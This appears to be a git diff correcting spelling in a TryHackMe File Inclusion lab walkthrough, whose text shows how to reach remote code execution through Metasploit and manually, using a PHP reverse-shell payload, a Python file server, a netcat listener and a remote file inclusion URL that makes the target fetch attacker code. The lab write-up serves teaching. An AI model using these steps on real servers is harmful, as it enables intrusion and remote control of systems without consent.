@@ -142,19 +142,19 @@ Now we and run the exploit be using either ```run``` or ```exploit```
 If successful we should see a meterpreter session has been created.  
 ![lab4_shell_success](./Images/lab4_shell_success.png)  
 
-Now we can spawn a bash shell and retrive the flag. Type in ```shell -b``` to spawn a bash shell and the input ```hostname``` to retrive our flag.  
+Now we can spawn a bash shell and retrieve the flag. Type in ```shell -b``` to spawn a bash shell and the input ```hostname``` to retrieve our flag.  
 ![lab4_flag](./Images/lab4_flag.png)  
 
 ### 👨‍💻 Manual shell option  
 Here I will demonstrate another method to gain RCE access without using Metasploit. Firstly we will need to find a payload to use and my go to is the Reverse TCP Payload which can be found here: [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)  
 Incidentally when you review the Metasploit option you will see that it is also using a reverse TCP payload to perform the attack.
 
-Lets open up a blank file on our machine with your prefered text editor. I will use nano so I will input ```nano rce.php``` into my terminal to open a new black file. One you have the file opened copy and paste the entire payload code linked in the above github repository. Once copied into our file we will need to configure a couple of items.  
+Lets open up a blank file on our machine with your preferred text editor. I will use nano so I will input ```nano rce.php``` into my terminal to open a new black file. One you have the file opened copy and paste the entire payload code linked in the above github repository. Once copied into our file we will need to configure a couple of items.  
 
 #### ⚙️ **Options**  
 Find the line starting with ```$ip```  
 **$ip** change this to be your attackbox or VM ip address  
-**$port** Input a selected port that we will use for your listner.  
+**$port** Input a selected port that we will use for your listener.  
 
 This should look similar to the below.  
 ![flag4_shell](./Images/flag4_shell.png)  
@@ -167,7 +167,7 @@ To start a http server input ```python3 -m http.server 5050``` this port is not 
 This should look like the below.  
 ![lab4_5050_server](./Images/lab4_5050_server.png)  
 
-Now lets setup our listner using netcat. This is where the payload will call back to and spawn our shell.  
+Now lets setup our listener using netcat. This is where the payload will call back to and spawn our shell.  
 Input ```nc -lnvp 8080``` into your terminal. The port here should match your payload port setup.  
 #### ⚙️ **Options**  
 **-l** Sets netcat into listen mode.  
@@ -179,19 +179,19 @@ These can all be combined into the string ```-lnvp``` followed by the required p
 This should look as below.  
 ![lab4_netcat](./Images/lab4_netcat.png) 
 
-Perfect now we have our payload set, our http server running to serve the payload and or listner going to wait for the reverse connection. Lets run the payload.  
+Perfect now we have our payload set, our http server running to serve the payload and or listener going to wait for the reverse connection. Lets run the payload.  
 
 Navigate to the ```MACHINE_IP/playground.php?``` site and input the below into the address bar.  
 ```MACHINE_IP/playground.php?file=http://YOUR_MACHINE_IP:5050/rce.php```  
 Which should look like the below  
 ![Lab4_url](./Images/Lab4_url.png)
 
-If successful we should se a GET request was recived by our http server.  
+If successful we should se a GET request was received by our http server.  
 ![lab4_http_server_manual](./Images/lab4_http_server_manual.png)  
 
-Our listner should have recived the reverse connetion. If succesful we can see the hosename in the initial connection details or type in ```hostname``` to capture our flag.
+Our listener should have received the reverse connection. If successful we can see the hostname in the initial connection details or type in ```hostname``` to capture our flag.
 ![lab4_flag_manual](./Images/lab4_flag_manual.png)
 
 ---
 
-Thank you for following through my guide of the TryHackMe file Inclusion challage section.
+Thank you for following through my guide of the TryHackMe file Inclusion challenge section.
